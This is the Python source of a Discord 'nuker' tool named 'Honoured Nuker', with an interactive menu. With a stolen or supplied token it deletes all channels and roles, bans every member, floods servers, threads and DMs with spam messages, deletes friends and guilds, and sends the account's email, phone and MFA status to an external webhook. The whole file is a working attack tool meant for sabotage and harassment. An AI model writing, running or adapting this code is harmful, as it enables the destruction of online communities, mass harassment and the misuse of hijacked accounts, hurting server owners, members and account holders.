import os
from pystyle import Colors,Colorate
import aiosonic
import requests
import time
import json
import asyncio
from tasksio import TaskPool
import random
import threading

os.system("title Honoured Nuker")

token = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] User/Bot token: ",1,0))
guild_id = input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Guild id: (server nuker only, if you're using account nuker leave blank) ",1,0))

spam_role_channels = ["nuked by sakai","by sakai","sakai solos"]
headers2={"Authorization": token}
headers={"Authorization": f"Bot {token}"}

def channels():
    return json.loads(requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=headers).text)

def channels2(guild_idd):
    return json.loads(requests.get(f"https://discord.com/api/v9/guilds/{guild_idd}/channels",headers=headers).text)

def roles():
    return json.loads(requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers).text)

def members():
    return json.loads(requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers).text)

def guilds():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers2).text)

def relationships():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers2).text)

def private_channels():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers2).text)

def bans():
    return json.loads(requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/bans?limit=1000", headers=headers).text)

async def create_channels(name):
    payload = {
        "name": name,
        "type": 0
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json=payload,headers=headers)

async def create_category(name):
    payload = {
        "name": name,
        "type": 4
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json=payload,headers=headers)

async def delete_channels(c_id):
    c_id = int(c_id)
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/channels/{c_id}",headers=headers)

async def create_roles(name):
    payload = {
        "name": name
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", json=payload,headers=headers)

async def delete_roles(r_id):
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r_id}",headers=headers)

async def ban_all(m_id):
    m_id = int(m_id)
    await aiosonic.HTTPClient().put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{m_id}", headers=headers)

async def unban(m_id):
    m_id = int(m_id)
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{m_id}", headers=headers)

async def ping_spam(content,c_id):
    c_id = int(c_id)
    payload = {
        "content" : content
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/channels/{c_id}/messages", json=payload,headers=headers)

def create_webhook(channel_id):
    channel_id = int(channel_id)
    payload = {
        "name": "The Honoured One"
    }
    r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", json=payload, headers=headers)
    if r.status_code == 200:
        webhook_data = r.json()
        webhook_url = webhook_data["url"]
        return webhook_url
    else:
        return None

def send_message(webhook_url, content):
    payload = {
        "content": content
    }
    requests.post(webhook_url, json=payload)

def send_message_to_multiple_channels(webhook_urls, content, num_messages):
    for webhook_url in webhook_urls:
        for _ in range(num_messages):
            for c in channels():
                send_message(webhook_url, content)

async def rename_guild(name):
    payload = {
        "name":name
    }
    await aiosonic.HTTPClient().patch(f"https://discord.com/api/v9/guilds/{guild_id}",json=payload,headers=headers)

async def thread_spam(name,c_id):
    payload = {
        "name":name
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/channels/{c_id}/threads",json=payload,headers=headers)

async def vc_spam(name):
    payload = {
        "name": name,
        "type": 2
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json=payload,headers=headers)

async def guild_delete(guild_id):
    payload = {
        "lurking": False
    }
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", json=payload,headers=headers2)
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/guilds/{guild_id}", json=payload,headers=headers2)

def token_info(web_url):
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers2).json()
    username = r["username"]
    user_id = r["id"]
    locale = r["locale"]
    email = r["email"]
    phone = r["phone"]
    mfa = r["mfa_enabled"]

    content = f"""
ID: {user_id}
Locale: {locale}
Email: {email}
Phone: {phone}    
MFA: {mfa}
"""
    embed = {
        "title": f"{username} info",
        "description": content,
        "color": 800080
    }
    payload = {
        "embeds": [embed]
    }
    requests.post(web_url,json=payload)


async def delete_friend(friend_id):
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}",headers=headers2)

async def block_friend(friend_id):
    payload = {
        "type": 2
    }
    await aiosonic.HTTPClient().put(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}", json=payload,headers=headers2)

async def close_dms(channel_id):
    await aiosonic.HTTPClient().delete(f"https://discord.com/api/v9/channels/{channel_id}",headers=headers2)

async def dm_spam(content, channel_id):
    channel_id = int(channel_id)
    payload = {
        "content": content,
        "tts": False
    }
    await aiosonic.HTTPClient().post(f"https://discord.com/api/v9/channels/{channel_id}/messages", json=payload,headers=headers2)

async def settings_changer():
    payload = {
        "theme": "light",
        "locale": "ko",
        "message_display_compact": False,
        "inline_embed_media": False,
        "inline_attachment_media": False,
        "gif_auto_play": False,
        "render_embeds": False,
        "render_reactions": False,
        "animate_emoji": False,
        "convert_emoticons": False,
        "enable_tts_command": False,
        "explicit_content_filter": "0",
        "friend_source_flags": {"all": False, "mutual_friends": False, "mutual_guilds": False},
    }
    await aiosonic.HTTPClient().patch("https://discord.com/api/v9/users/@me/settings", json=payload,headers=headers2)

banner = """


                                
                                      ░██████╗░░█████╗░░░░░░██╗░█████╗░
                                      ██╔════╝░██╔══██╗░░░░░██║██╔══██╗
                                      ██║░░██╗░██║░░██║░░░░░██║██║░░██║
                                      ██║░░╚██╗██║░░██║██╗░░██║██║░░██║
                                      ╚██████╔╝╚█████╔╝╚█████╔╝╚█████╔╝
                                      ░╚═════╝░░╚════╝░░╚════╝░░╚════╝░
                                                            
______________________________________________________________________________________________________________________

                        [1] Nuke                                 [7] Unban Members
                        [2] Delete Channels                      [8] Threads Spam
                        [3] Create Channels                      [9] Category Spam
                        [4] Delete Roles                         [10] VC Spam
                        [5] Create Roles                         [11] Ping spam
                        [6] Ban Members                          [12] Guild Rename

______________________________________________________________________________________________________________________

"""

banner2 = """


                                
                                      ░██████╗░░█████╗░░░░░░██╗░█████╗░
                                      ██╔════╝░██╔══██╗░░░░░██║██╔══██╗
                                      ██║░░██╗░██║░░██║░░░░░██║██║░░██║
                                      ██║░░╚██╗██║░░██║██╗░░██║██║░░██║
                                      ╚██████╔╝╚█████╔╝╚█████╔╝╚█████╔╝
                                      ░╚═════╝░░╚════╝░░╚════╝░░╚════╝░
                                                            
______________________________________________________________________________________________________________________

                        [1] Leave/delete Guild                [5] Close DMs
                        [2] Token info                        [6] DM Spam
                        [3] Delete Friends                    [7] Change Settings
                        [4] Block Friends                     [8] Hypesquad Joiner                         

______________________________________________________________________________________________________________________

"""

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers=headers).status_code == 200:
        return "valid"
    else:
        return "invalid"

account_type = "valid"

async def menu():
    os.system("cls")
    if account_type == check_token():
        print(Colorate.Horizontal(Colors.cyan_to_blue, banner, 1, 0))
        option = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Choose your option: ", 1, 0)) 

        if option == "1":
            async with TaskPool(1_000) as pool:
                for c in channels():
                    await pool.put(delete_channels(c["id"]))
            async with TaskPool(1_000) as pool:
                for i in range(150):
                    await pool.put(create_channels(random.choice(spam_role_channels)))
            async with TaskPool(1_000) as pool:
                for r in roles():
                    await pool.put(delete_roles(r["id"]))
            async with TaskPool(1_000) as pool:
                for i in range(150):
                    await pool.put(create_roles(random.choice(spam_role_channels)))
            await menu()

        elif option == "2":
            async with TaskPool(1_000) as pool:
                for c in channels():
                    await pool.put(delete_channels(c["id"]))
            await menu()

        elif option == "3":
            channel_names = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Channels Name: ", 1, 0))
            channels_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Channels Amount: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(channels_amount):
                    await pool.put(create_channels(channel_names))
            await menu()

        elif option == "4":
            async with TaskPool(1_000) as pool:
                for r in roles():
                    await pool.put(delete_roles(r["id"]))
            await menu()

        elif option == "5":
            role_names = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Roles Name: ", 1, 0))
            role_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Roles Amount: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(role_amount):
                    await pool.put(create_roles(role_names))
            await menu()

        elif option == "6":
            async with TaskPool(1_000) as pool:
                for m in members():
                    await pool.put(ban_all(m["user"]["id"]))
            await menu()

        elif option == "7":
            async with TaskPool(1_000) as pool:
                for u in bans():
                    await pool.put(unban(u["user"]["id"]))

        elif option == "8":
            thread_names = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Threads Name: ", 1, 0))
            thread_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Threads Amount: ", 1, 0)))
            channel_id = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Channel ID: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(thread_amount):
                    await pool.put(thread_spam(thread_names,channel_id))
            await menu()

        elif option == "9":
            category_names = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Categories Name: ", 1, 0))
            category_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Categories Amount: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(category_amount):
                    await pool.put(create_category(category_names))
            await menu()

        elif option == "10":
            vc_names = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] VCs Name: ", 1, 0))
            vc_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] VCs Amount: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(vc_amount):
                    await pool.put(vc_spam(vc_names))
            await menu()

        elif option == "11":
            spam_message = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Messages Content: ", 1, 0))
            msg_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Messages Amount: ", 1, 0)))

            async with TaskPool(1_000) as pool:
                for i in range(msg_amount):
                    for chan in channels():
                        await pool.put(ping_spam(spam_message, chan["id"]))
            await menu()

        elif option == "12":
            guild_name = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Guild Name: ", 1, 0))

            await rename_guild(guild_name)
            await menu()

        elif option == "13":
            spam_message = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Messages Content: ", 1, 0))
            msg_amount = int(input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Messages Amount: ", 1, 0)))

            webhook_urls = []
            for c in channels():
                webhook_url = create_webhook(c["id"])
                if webhook_url:
                    webhook_urls.append(webhook_url)

            if webhook_urls:
                content = spam_message
                for ch in channels():
                    threading.Thread(target=send_message_to_multiple_channels, args=(webhook_urls,content,msg_amount,)).start()

        else:
            print(Colorate.Horizontal(Colors.red, "\n [!] Invalid Option", 1, 0))
            time.sleep(2)
            await menu()
        await menu()
    else:
        os.system("cls")
        print(Colorate.Horizontal(Colors.cyan_to_blue, banner2, 1, 0))
        choice = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Choose your option: ", 1, 0))

        if choice == "1":
            async with TaskPool(1_000) as pool:
                for g in guilds():
                    await pool.put(guild_delete(g["id"]))
            await menu()

        elif choice == "2":
            webhook_url = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Webhook url: ", 1, 0))
            token_info(webhook_url)

        elif choice == "3":
            async with TaskPool(1_000) as pool:
                for f in relationships():
                    await pool.put(delete_friend(f["id"]))
            await menu()

        elif choice == "4":
            async with TaskPool(1_000) as pool:
                for f in relationships():
                    await pool.put(block_friend(f["id"]))
            await menu()

        elif choice == "5":
            async with TaskPool(1_000) as pool:
                for ch in private_channels():
                    await pool.put(close_dms(ch["id"]))
            await menu()

        elif choice == "6":
            spam_message = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] Messages Content: ", 1, 0))

            async with TaskPool(1_000) as pool:
                for chan in private_channels():
                    await pool.put(dm_spam(spam_message, chan["id"]))
            await menu()

        elif choice == "7":
            await settings_changer()
            await menu()

        elif choice == "8":
            uwu = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] House to Join [1/2/3/random]: ", 1, 0))
            if uwu == "1":
                payload = {'house_id': 1}
            elif uwu == "2":
                payload = {'house_id': 2}
            elif uwu == "3":
                payload = {'house_id': 3}
            elif uwu in ["random", "Random", "4"]:
                houses = [1, 2, 3]
                payload = {'house_id': random.choice(houses)}

            await aiosonic.HTTPClient().post("https://discordapp.com/api/v9/hypesquad/online", json=payload,headers=headers)

        else:
            print(Colorate.Horizontal(Colors.red, "\n [!] Invalid Option", 1, 0))
            time.sleep(2)
            await menu()
        await menu()


asyncio.run(menu())
